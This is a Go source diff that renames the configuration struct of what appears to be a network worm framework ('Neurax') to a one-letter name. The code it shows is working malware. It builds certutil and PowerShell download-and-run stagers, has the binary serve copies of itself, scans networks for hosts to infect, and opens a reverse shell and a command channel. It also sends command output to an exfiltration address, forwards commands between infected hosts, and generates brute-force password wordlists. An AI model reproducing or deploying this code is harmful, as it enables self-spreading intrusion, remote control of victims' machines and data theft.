@@ -79,7 +79,7 @@ var CommonPasswordsCountries = map[string][]string{
 	"de": []string{"123456", "123456789", "12345678", "passwort", "qwerty", "hallo123", "12345", "1234", "hallo", "1234567", "huhbbhzu78", "password", "ficken", "killer", "1q2w3e4r", "qwertz", "lol123", "schalke04", "master", "1234567890", "dennis", "daniel", "alexander", "111111", "fussball", "schatz", "arschloch", "123123", "1234561", "schalke", "michael", "starwars", "computer", "werder", "abc123", "wasser", "andreas", "florian", "internet", "michelle", "sommer", "berlin", "000000", "asdfgh", "sandra", "pokemon", "marcel", "Passwort", "thomas", "hamburg", "dragon", "christian", "bayern", "geheim", "handball", "dortmund", "666666", "ichliebedich", "sebastian", "patrick", "tobias", "nicole", "martin", "bushido", "sascha", "stefan", "asdasd", "fabian", "dominik", "1q2w3e4r5t", "jasmin", "justin", "logitech", "eminem", "benjamin", "maximilian", "sabrina", "yxcvbnm", "samsung", "SKIFFY", "1234qwer", "markus", "schule", "hallo1", "pascal", "merlin", "nadine", "1234567891", "1qay2wsx", "snoopy", "moritz", "medion", "lollol", "playboy", "123qwe", "vanessa", "mercedes", "matrix", "philipp", "oliver", "wertz123", "sunshine", "hurensohn", "Hallo123", "borussia", "passwort1", "aaaaaa", "schatzi", "sonnenschein", "blabla", "info", "werner", "fcbayern", "charly", "q1w2e3r4", "marvin", "jennifer", "niklas", "asdf1234", "iloveyou", "julian", "asdf", "qwer1234", "andrea", "melanie", "porsche", "kennwort", "johannes", "deutschland", "987654321", "123321", "infoinfo", "sternchen", "jessica", "1q2w3e", "sabine", "1111", "654321", "Status", "hamster", "matthias", "slipknot", "onkelz", "vergessen", "asdfghjkl", "steffi", "minecraft", "manuel", "fickdich", "asd123"},
 }
 
-type __NeuraxConfig struct {
+type __N struct {
 	Stager                   string
 	StagerSudo               bool
 	StagerRetry              int
@@ -128,7 +128,7 @@ type __NeuraxConfig struct {
 	Debug                    bool
 }
 
-var NeuraxConfig = __NeuraxConfig{
+var N = __N{
 	Stager:                   "random",
 	StagerSudo:               false,
 	StagerRetry:              0,
@@ -179,9 +179,9 @@ var NeuraxConfig = __NeuraxConfig{
 
 //Verbose error printing
 func ReportError(message string, e error) {
-	if e != nil && NeuraxConfig.Verbose {
+	if e != nil && N.Verbose {
 		fmt.Printf("ERROR %s: %s", message, e.Error())
-		if NeuraxConfig.Remove {
+		if N.Remove {
 			os.Remove(os.Args[0])
 		}
 	}
@@ -194,7 +194,7 @@ func NeuraxStager() string {
 	paths := []string{}
 	b64_decoder := ""
 	sudo := ""
-	stager_retry := strconv.Itoa(NeuraxConfig.StagerRetry + 1)
+	stager_retry := strconv.Itoa(N.StagerRetry + 1)
 	windows_stagers := [][]string{
 		[]string{"certutil", `for /l %%N in (1 1 RETRY) do certutil.exe -urlcache -split -f URL && B64 SAVE_PATH\FILENAME`},
 		[]string{"powershell", `for /l %%N in (1 1 RETRY) do Invoke-WebRequest URL/FILENAME -O SAVE_PATH\FILENAME && B64 SAVE_PATH\FILENAME`},
@@ -207,32 +207,32 @@ func NeuraxStager() string {
 	linux_save_paths := []string{"/tmp/", "/lib/", "/home/",
 		"/etc/", "/usr/", "/usr/share/"}
 	windows_save_paths := []string{`C:\$recycle.bin\`, `C:\ProgramData\MicrosoftHelp\`}
-	switch NeuraxConfig.Platform {
+	switch N.Platform {
 	case "windows":
 		stagers = windows_stagers
 		paths = windows_save_paths
-		if NeuraxConfig.Base64 {
+		if N.Base64 {
 			b64_decoder = "certutil -decode SAVE_PATH/FILENAME SAVE_PATH/FILENAME;"
 		}
 	case "linux", "darwin":
 		stagers = linux_stagers
 		paths = linux_save_paths
-		if NeuraxConfig.Base64 {
+		if N.Base64 {
 			b64_decoder = "cat SAVE_PATH/FILENAME|base64 -d > SAVE_PATH/FILENAME;"
 		}
 	}
-	if NeuraxConfig.Stager == "random" {
+	if N.Stager == "random" {
 		stager = RandomSelectStrNested(stagers)
 	} else {
 		for s := range stagers {
 			st := stagers[s]
-			if st[0] == NeuraxConfig.Stager {
+			if st[0] == N.Stager {
 				stager = st
 			}
 		}
 	}
 	selected_stager_command := stager[1]
-	if NeuraxConfig.Stager == "chain" {
+	if N.Stager == "chain" {
 		chained_commands := []string{}
 		for s := range stagers {
 			st := stagers[s]
@@ -244,19 +244,19 @@ func NeuraxStager() string {
 		}
 		selected_stager_command = strings.Join(chained_commands, " "+separator+" ")
 	}
-	if NeuraxConfig.Path == "random" {
-		NeuraxConfig.Path = RandomSelectStr(paths)
+	if N.Path == "random" {
+		N.Path = RandomSelectStr(paths)
 	}
-	if NeuraxConfig.FileName == "random" && NeuraxConfig.Platform == "windows" {
-		NeuraxConfig.FileName += ".exe"
+	if N.FileName == "random" && N.Platform == "windows" {
+		N.FileName += ".exe"
 	}
-	if NeuraxConfig.StagerSudo {
+	if N.StagerSudo {
 		sudo = "sudo"
 	}
-	url := fmt.Sprintf("http://%s:%d/%s", NeuraxConfig.LocalIp, NeuraxConfig.Port, NeuraxConfig.FileName)
+	url := fmt.Sprintf("http://%s:%d/%s", N.LocalIp, N.Port, N.FileName)
 	selected_stager_command = strings.Replace(selected_stager_command, "URL", url, -1)
-	selected_stager_command = strings.Replace(selected_stager_command, "FILENAME", NeuraxConfig.FileName, -1)
-	selected_stager_command = strings.Replace(selected_stager_command, "SAVE_PATH", NeuraxConfig.Path, -1)
+	selected_stager_command = strings.Replace(selected_stager_command, "FILENAME", N.FileName, -1)
+	selected_stager_command = strings.Replace(selected_stager_command, "SAVE_PATH", N.Path, -1)
 	selected_stager_command = strings.Replace(selected_stager_command, "B64", b64_decoder, -1)
 	selected_stager_command = strings.Replace(selected_stager_command, "SUDO", sudo, -1)
 	selected_stager_command = strings.Replace(selected_stager_command, "RETRY", stager_retry, -1)
@@ -265,27 +265,27 @@ func NeuraxStager() string {
 
 //Binary serves itself
 func NeuraxServer() {
-	/*if NeuraxConfig.prevent_reinfect {
-		go net.Listen("tcp", "0.0.0.0:"+NeuraxConfig.knock_port)
+	/*if N.prevent_reinfect {
+		go net.Listen("tcp", "0.0.0.0:"+N.knock_port)
 	}*/
 	data, _ := ioutil.ReadFile(os.Args[0])
-	if NeuraxConfig.Base64 {
+	if N.Base64 {
 		data = []byte(B64E(string(data)))
 	}
-	addr := fmt.Sprintf(":%d", NeuraxConfig.Port)
+	addr := fmt.Sprintf(":%d", N.Port)
 	go http.ListenAndServe(addr, http.HandlerFunc(func(rw http.ResponseWriter, r *http.Request) {
-		http.ServeContent(rw, r, NeuraxConfig.FileName, time.Now(), bytes.NewReader(data))
+		http.ServeContent(rw, r, N.FileName, time.Now(), bytes.NewReader(data))
 	}))
 }
 
 //Returns true if host is active
 func IsHostActive(target string) bool {
-	if Contains(NeuraxConfig.Blacklist, target) {
+	if Contains(N.Blacklist, target) {
 		return false
 	}
-	if NeuraxConfig.ScanShaker {
-		for _, port := range NeuraxConfig.ScanShakerPorts {
-			timeout := time.Duration(NeuraxConfig.ScanActiveTimeout) * time.Second
+	if N.ScanShaker {
+		for _, port := range N.ScanShakerPorts {
+			timeout := time.Duration(N.ScanActiveTimeout) * time.Second
 			port_str := strconv.Itoa(port)
 			err, _ := net.DialTimeout("tcp", target+port_str, timeout)
 			if err == nil {
@@ -296,23 +296,23 @@ func IsHostActive(target string) bool {
 	} else {
 		first := 19
 		last := 300
-		if NeuraxConfig.ScanFullRange {
+		if N.ScanFullRange {
 			last = 65535
 		}
-		if NeuraxConfig.ScanFast {
-			NeuraxConfig.ScanActiveTimeout = 2
-			NeuraxConfig.ScanThreads = 20
+		if N.ScanFast {
+			N.ScanActiveTimeout = 2
+			N.ScanThreads = 20
 			first = 21
 			last = 81
 		}
-		ps := portscanner.NewPortScanner(target, time.Duration(NeuraxConfig.ScanActiveTimeout)*time.Second, NeuraxConfig.ScanThreads)
+		ps := portscanner.NewPortScanner(target, time.Duration(N.ScanActiveTimeout)*time.Second, N.ScanThreads)
 		opened_ports := ps.GetOpenedPort(first, last)
 		if len(opened_ports) != 0 {
-			if NeuraxConfig.ScanRequiredPort == 0 {
+			if N.ScanRequiredPort == 0 {
 				NeuraxDebug("Found active host: " + target)
 				return true
 			} else {
-				if PortscanSingle(target, NeuraxConfig.ScanRequiredPort) {
+				if PortscanSingle(target, N.ScanRequiredPort) {
 					NeuraxDebug("Found active host: " + target)
 					return true
 				}
@@ -324,14 +324,14 @@ func IsHostActive(target string) bool {
 
 //Returns true if host is infected
 func IsHostInfected(target string) bool {
-	if Contains(NeuraxConfig.Blacklist, target) {
+	if Contains(N.Blacklist, target) {
 		return false
 	}
 	if Contains(InfectedHosts, target) {
 		return true
 	}
-	target_url := fmt.Sprintf("http://%s:%d/", target, NeuraxConfig.Port)
-	if NeuraxConfig.FastHTTP {
+	target_url := fmt.Sprintf("http://%s:%d/", target, N.Port)
+	if N.FastHTTP {
 		req := fasthttp.AcquireRequest()
 		defer fasthttp.ReleaseRequest(req)
 		req.SetRequestURI(target_url)
@@ -381,7 +381,7 @@ func NeuraxSignal(addr string) {
 }*/
 
 func handle_command(cmd string) {
-	if NeuraxConfig.PreventReexec {
+	if N.PreventReexec {
 		if Contains(ReceivedCommands, cmd) {
 			return
 		}
@@ -389,7 +389,7 @@ func handle_command(cmd string) {
 	}
 	DataSender := SendDataUDP
 	forwarded_preamble := ""
-	if NeuraxConfig.CommProto == "tcp" {
+	if N.CommProto == "tcp" {
 		DataSender = SendDataTCP
 	}
 	preamble := strings.Fields(cmd)[0]
@@ -423,8 +423,8 @@ func handle_command(cmd string) {
 				fmt.Println(out)
 			}
 			if strings.Contains(preamble, "v") {
-				host := strings.Split(NeuraxConfig.ExfilAddr, ":")[0]
-				port := strings.Split(NeuraxConfig.ExfilAddr, ":")[1]
+				host := strings.Split(N.ExfilAddr, ":")[0]
+				port := strings.Split(N.ExfilAddr, ":")[1]
 				p, _ := strconv.Atoi(port)
 				SendDataTCP(host, p, out)
 			}
@@ -437,7 +437,7 @@ func handle_command(cmd string) {
 		if strings.Contains(preamble, "a") && !no_forward {
 			fmt.Println(InfectedHosts)
 			for _, host := range InfectedHosts {
-				err := DataSender(host, NeuraxConfig.CommPort, fmt.Sprintf("%s %s", forwarded_preamble, cmd))
+				err := DataSender(host, N.CommPort, fmt.Sprintf("%s %s", forwarded_preamble, cmd))
 				ReportError("Cannot send command", err)
 				if strings.Contains(preamble, "o") && !strings.Contains(preamble, "m") {
 					break
@@ -464,7 +464,7 @@ func handle_command(cmd string) {
 
 //Opens port (.CommPort) and waits for commands
 func NeuraxOpenComm() {
-	l, err := net.Listen(NeuraxConfig.CommProto, "0.0.0.0:"+strconv.Itoa(NeuraxConfig.CommPort))
+	l, err := net.Listen(N.CommProto, "0.0.0.0:"+strconv.Itoa(N.CommPort))
 	ReportError("Comm listen error", err)
 	for {
 		conn, err := l.Accept()
@@ -480,7 +480,7 @@ func NeuraxOpenComm() {
 
 //Launches a reverse shell. Each received command is passed to handle_command()
 func NeuraxReverse() {
-	conn, _ := net.Dial(NeuraxConfig.ReverseProto, NeuraxConfig.ReverseListener)
+	conn, _ := net.Dial(N.ReverseProto, N.ReverseListener)
 	for {
 		command, err := bufio.NewReader(conn).ReadString('\n')
 		if err != nil {
@@ -493,8 +493,8 @@ func NeuraxReverse() {
 
 func neurax_scan_passive_single_iface(f func(string), iface string) {
 	var snapshot_len int32 = 1024
-	timeout := time.Duration(NeuraxConfig.ScanPassiveTimeout) * time.Second
-	if NeuraxConfig.ScanFast {
+	timeout := time.Duration(N.ScanPassiveTimeout) * time.Second
+	if N.ScanFast {
 		timeout = 50 * time.Second
 	}
 	handler, err := pcap.OpenLive(iface, snapshot_len, false, timeout)
@@ -521,8 +521,8 @@ func neurax_scan_passive_single_iface(f func(string), iface string) {
 func neurax_scan_passive(f func(string)) {
 	current_iface, _ := Iface()
 	ifaces_to_use := []string{current_iface}
-	if NeuraxConfig.ScanPassiveIface != "default" {
-		ifaces_to_use = []string{NeuraxConfig.ScanPassiveIface}
+	if N.ScanPassiveIface != "default" {
+		ifaces_to_use = []string{N.ScanPassiveIface}
 	}
 	device_names := []string{}
 	devices, err := pcap.FindAllDevs()
@@ -530,7 +530,7 @@ func neurax_scan_passive(f func(string)) {
 		device_names = append(device_names, dev.Name)
 	}
 	ReportError("Cannot obtain network interfaces", err)
-	if NeuraxConfig.ScanAll {
+	if N.ScanAll {
 		ifaces_to_use = append(ifaces_to_use, device_names...)
 	}
 	for _, device := range ifaces_to_use {
@@ -540,12 +540,12 @@ func neurax_scan_passive(f func(string)) {
 
 func neurax_scan_active(f func(string)) {
 	targets := []string{}
-	if NeuraxConfig.ScanGatewayFirst {
+	if N.ScanGatewayFirst {
 		gateway := GetGatewayIP()
 		targets = append(targets, gateway)
 		NeuraxDebug("Added gateway to targets pool: " + gateway)
 	}
-	if NeuraxConfig.ScanArpCache {
+	if N.ScanArpCache {
 		for ip, _ := range arp.Table() {
 			if !IsHostInfected(ip) {
 				targets = append(targets, ip)
@@ -553,33 +553,33 @@ func neurax_scan_active(f func(string)) {
 		}
 		NeuraxDebug(F("Found %d targets in ARP cache", len(arp.Table())))
 	}
-	full_addr_range, _ := ExpandCidr(NeuraxConfig.Cidr)
+	full_addr_range, _ := ExpandCidr(N.Cidr)
 	for _, addr := range full_addr_range {
-		if !Contains(NeuraxConfig.Blacklist, addr) {
+		if !Contains(N.Blacklist, addr) {
 			targets = append(targets, addr)
 		}
 	}
 	targets = RemoveFromSlice(targets, GetLocalIp())
-	if len(NeuraxConfig.ScanFirst) != 0 {
-		targets = append(NeuraxConfig.ScanFirst, targets...)
+	if len(N.ScanFirst) != 0 {
+		targets = append(N.ScanFirst, targets...)
 	}
-	if len(NeuraxConfig.ScanOnly) != 0 {
-		targets = NeuraxConfig.ScanOnly
+	if len(N.ScanOnly) != 0 {
+		targets = N.ScanOnly
 	}
 	for _, target := range targets {
 		NeuraxDebug("Scanning " + target)
 		if IsHostActive(target) && !IsHostInfected(target) {
 			NeuraxDebug("Scanned " + target)
 			go f(target)
-			if NeuraxConfig.ScanHostInterval != "none" {
-				time.Sleep(time.Duration(IntervalToSeconds(NeuraxConfig.ScanHostInterval)) * time.Second)
+			if N.ScanHostInterval != "none" {
+				time.Sleep(time.Duration(IntervalToSeconds(N.ScanHostInterval)) * time.Second)
 			}
 		}
 	}
 }
 
 func neurax_scan_core(f func(string)) {
-	if NeuraxConfig.ScanPassive {
+	if N.ScanPassive {
 		neurax_scan_passive(f)
 	} else {
 		neurax_scan_active(f)
@@ -590,20 +590,20 @@ func neurax_scan_core(f func(string)) {
 func NeuraxScan(f func(string)) {
 	for {
 		neurax_scan_core(f)
-		time.Sleep(time.Duration(IntervalToSeconds(NeuraxConfig.ScanInterval)))
+		time.Sleep(time.Duration(IntervalToSeconds(N.ScanInterval)))
 	}
 }
 
 func NeuraxDebug(msg string) {
-	if NeuraxConfig.Debug {
+	if N.Debug {
 		PrintInfo(msg)
 	}
 }
 
 func NeuraxScanInfected(c chan string) {
-	full_addr_range, _ := ExpandCidr(NeuraxConfig.Cidr)
+	full_addr_range, _ := ExpandCidr(N.Cidr)
 	for _, addr := range full_addr_range {
-		if !Contains(NeuraxConfig.Blacklist, addr) {
+		if !Contains(N.Blacklist, addr) {
 			if IsHostInfected(addr) {
 				c <- addr
 			}
@@ -662,11 +662,11 @@ func gen_haiku() string {
 //Removes binary from all nodes that can be reached
 func NeuraxPurge() {
 	DataSender := SendDataUDP
-	if NeuraxConfig.CommProto == "tcp" {
+	if N.CommProto == "tcp" {
 		DataSender = SendDataTCP
 	}
 	for _, host := range InfectedHosts {
-		err := DataSender(host, NeuraxConfig.CommPort, "purge")
+		err := DataSender(host, N.CommPort, "purge")
 		ReportError("Cannot perform purge", err)
 	}
 	handle_command("purge")
@@ -774,13 +774,13 @@ func RussianRoulette() error {
 
 //Returns transformed words from input slice
 func NeuraxWordlist(words ...string) []string {
-	use_all := Contains(NeuraxConfig.WordlistMutators, "all")
+	use_all := Contains(N.WordlistMutators, "all")
 	wordlist := []string{}
-	for i := 0; i < NeuraxConfig.WordlistCommonNum; i++ {
+	for i := 0; i < N.WordlistCommonNum; i++ {
 		wordlist = append(wordlist, CommonPasswords[i])
 	}
-	if len(NeuraxConfig.WordlistCommonCountries) != 0 {
-		for cn, num := range NeuraxConfig.WordlistCommonCountries {
+	if len(N.WordlistCommonCountries) != 0 {
+		for cn, num := range N.WordlistCommonCountries {
 			wordlist = append(wordlist, CommonPasswordsCountries[cn][0:num]...)
 		}
 	}
@@ -796,29 +796,29 @@ func NeuraxWordlist(words ...string) []string {
 		wordlist = append(wordlist, word+"1")
 		wordlist = append(wordlist, word+"12")
 		wordlist = append(wordlist, word+"123")
-		if NeuraxConfig.WordlistExpand {
-			if Contains(NeuraxConfig.WordlistMutators, "encapsule") || use_all {
+		if N.WordlistExpand {
+			if Contains(N.WordlistMutators, "encapsule") || use_all {
 				wordlist = append(wordlist, WordEncapsule(word)...)
 			}
-			if Contains(NeuraxConfig.WordlistMutators, "cyryllic") || use_all {
+			if Contains(N.WordlistMutators, "cyryllic") || use_all {
 				wordlist = append(wordlist, WordCyryllicReplace(word)...)
 			}
-			if Contains(NeuraxConfig.WordlistMutators, "single_upper") || use_all {
+			if Contains(N.WordlistMutators, "single_upper") || use_all {
 				wordlist = append(wordlist, WordSingleUpperTransform(word)...)
 			}
-			if Contains(NeuraxConfig.WordlistMutators, "basic_leet") || use_all {
+			if Contains(N.WordlistMutators, "basic_leet") || use_all {
 				wordlist = append(wordlist, WordBasicLeet(word)...)
 			}
-			if Contains(NeuraxConfig.WordlistMutators, "full_leet") || use_all {
+			if Contains(N.WordlistMutators, "full_leet") || use_all {
 				wordlist = append(wordlist, WordFullLeet(word)...)
 			}
-			if Contains(NeuraxConfig.WordlistMutators, "revert") || use_all {
+			if Contains(N.WordlistMutators, "revert") || use_all {
 				wordlist = append(wordlist, WordRevert(word)...)
 			}
-			if Contains(NeuraxConfig.WordlistMutators, "duplicate") || use_all {
+			if Contains(N.WordlistMutators, "duplicate") || use_all {
 				wordlist = append(wordlist, WordDuplicate(word)...)
 			}
-			if Contains(NeuraxConfig.WordlistMutators, "char_swap") || use_all {
+			if Contains(N.WordlistMutators, "char_swap") || use_all {
 				wordlist = append(wordlist, WordCharSwap(word)...)
 			}
 		}
@@ -830,11 +830,11 @@ func NeuraxWordlist(words ...string) []string {
 func NeuraxWordlistPermute(words ...string) []string {
 	res := []string{}
 	permuted := ""
-	sep := NeuraxConfig.WordlistPermuteSeparator
+	sep := N.WordlistPermuteSeparator
 	for _, word := range words {
 		cur_perm_len := len(strings.Split(permuted, sep))
 		selected := RandomSelectStr(words)
-		if !strings.Contains(permuted, selected) && cur_perm_len < NeuraxConfig.WordlistPermuteNum {
+		if !strings.Contains(permuted, selected) && cur_perm_len < N.WordlistPermuteNum {
 			permuted += word + sep + selected + sep
 			res = append(res, permuted)
 		}
@@ -865,7 +865,7 @@ func NeuraxMigrate(path string) error {
 func NeuraxAlloc() {
 	min_alloc := SizeToBytes("10m")
 	max_alloc := SizeToBytes("600m")
-	for n := 0; n < NeuraxConfig.AllocNum; n++ {
+	for n := 0; n < N.AllocNum; n++ {
 		num_bytes := RandomInt(min_alloc, max_alloc)
 		_ = make([]byte, num_bytes)
 	}
